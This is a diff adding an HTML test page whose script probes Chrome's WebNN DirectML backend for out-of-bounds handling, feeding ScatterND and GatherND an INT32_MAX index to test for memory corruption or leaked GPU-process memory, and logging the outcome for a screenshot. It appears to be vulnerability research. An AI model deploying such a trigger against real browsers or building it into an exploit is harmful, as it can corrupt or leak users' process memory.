@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html><head><title>WebNN DML ScatterND Test</title>
+<style>body{font-family:monospace;padding:20px}pre{background:#111;color:#0f0;padding:15px;border-radius:5px;overflow:auto;max-height:600px}</style>
+</head><body>
+<h2>WebNN ScatterND OOB Index Test (DML/Windows)</h2>
+<p>This tests if DirectML validates ScatterND indices. Open DevTools (F12) to see full output.</p>
+<pre id="log">Starting...</pre>
+<script>
+const L=document.getElementById("log");
+function log(m){L.textContent+=m+"\n";console.log(m);}
+
+async function run(){
+L.textContent="";
+log("=== WebNN ScatterND OOB Index Test ===");
+log("Platform: "+navigator.platform);
+log("UA: "+navigator.userAgent);
+log("");
+
+if(!navigator.ml){
+  log("ERROR: WebNN not available.");
+  log("Enable: chrome://flags/#web-machine-learning-neural-network");
+  log("Then restart Chrome and reload this page.");
+  return;
+}
+
+try{
+  log("[1] Creating ML context (cpu)...");
+  const ctx=await navigator.ml.createContext({deviceType:"cpu"});
+  log("    OK: "+ctx);
+
+  const b=new MLGraphBuilder(ctx);
+
+  // Test 1: ScatterND with INT32_MAX index on tiny tensor
+  log("");
+  log("[2] ScatterND: index=2147483647 on [4,4] tensor (dim size 4)");
+  const input=b.input("input",{dataType:"float32",shape:[4,4]});
+  const idx=b.constant({dataType:"int32",shape:[1,1]},new Int32Array([2147483647]));
+  const upd=b.constant({dataType:"float32",shape:[1,4]},new Float32Array([0xDE,0xAD,0xBE,0xEF]));
+  const out=b.scatterND(input,idx,upd);
+  log("    OK: ScatterND op created");
+
+  log("[3] Building graph...");
+  const graph=await b.build({output:out});
+  log("    OK: Graph built with OOB index");
+
+  log("[4] Creating tensors...");
+  let inT,outT;
+  try{
+    inT=await ctx.createTensor({dataType:"float32",shape:[4,4],writable:true,readable:true});
+    outT=await ctx.createTensor({dataType:"float32",shape:[4,4],writable:true,readable:true});
+  }catch(e){
+    log("    Tensor API error: "+e.message);
+    log("    Graph was built with OOB indices - that alone is significant.");
+    log("=== DONE ===");
+    return;
+  }
+  log("    OK");
+
+  await ctx.writeTensor(inT,new Float32Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]));
+
+  log("[5] Dispatching ScatterND with INT32_MAX index...");
+  log("    If DirectML wraps: output has modified data at wrapped position");
+  log("    If DirectML crashes: GPU process dies (RELOAD PAGE TO CONFIRM)");
+  log("    If DirectML OOB writes: memory corruption (may not be visible)");
+  ctx.dispatch(graph,{input:inT},{output:outT});
+  const r=await ctx.readTensor(outT);
+  const arr=Array.from(new Float32Array(r));
+  log("    OUTPUT: "+JSON.stringify(arr));
+  log("");
+
+  // Analyze output
+  const expected=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16];
+  let modified=[];
+  for(let i=0;i<arr.length;i++){
+    if(arr[i]!==expected[i])modified.push({idx:i,got:arr[i],expected:expected[i]});
+  }
+
+  if(modified.length===0){
+    log("RESULT: Output unchanged — DML may have silently ignored OOB index");
+  }else{
+    log("RESULT: Output MODIFIED at positions:");
+    modified.forEach(m=>log("  ["+m.idx+"]: expected "+m.expected+", got "+m.got));
+    log("");
+    log("  If index wrapped (modulo): DML handled it safely (like CoreML)");
+    log("  If data appears corrupted: POTENTIAL MEMORY CORRUPTION");
+  }
+
+  // Test 2: GatherND with OOB (read primitive)
+  log("");
+  log("[6] GatherND: index=2147483647 on [4,4] tensor");
+  const b2=new MLGraphBuilder(ctx);
+  const gi=b2.input("gi",{dataType:"float32",shape:[4,4]});
+  const gidx=b2.constant({dataType:"int32",shape:[1,1]},new Int32Array([2147483647]));
+  const gout=b2.gatherND(gi,gidx);
+  const gg=await b2.build({output:gout});
+
+  const giT=await ctx.createTensor({dataType:"float32",shape:[4,4],writable:true,readable:true});
+  const goT=await ctx.createTensor({dataType:"float32",shape:[1,4],writable:true,readable:true});
+  await ctx.writeTensor(giT,new Float32Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]));
+
+  ctx.dispatch(gg,{gi:giT},{output:goT});
+  const gr=await ctx.readTensor(goT);
+  const garr=Array.from(new Float32Array(gr));
+  log("    GatherND OUTPUT: "+JSON.stringify(garr));
+
+  if(garr.some(v=>v!==0&&![1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16].includes(v))){
+    log("*** POTENTIAL OOB READ: unexpected values in output ***");
+    log("*** These values may be leaked from GPU process memory ***");
+  }else if(JSON.stringify(garr)==="[0,0,0,0]"){
+    log("  DML returned zeros for OOB — safe handling");
+  }else{
+    log("  DML returned data from wrapped index — safe handling (like CoreML)");
+  }
+
+}catch(e){
+  log("");
+  log("ERROR: "+e.message);
+  if(e.message.includes("not supported"))log("ScatterND may not be supported on DML backend");
+  if(e.message.includes("lost"))log("*** GPU PROCESS CRASHED — potential memory corruption ***");
+}
+log("");
+log("=== DONE ===");
+log("Screenshot this output and send it.");
+}
+
+run();
+</script></body></html>
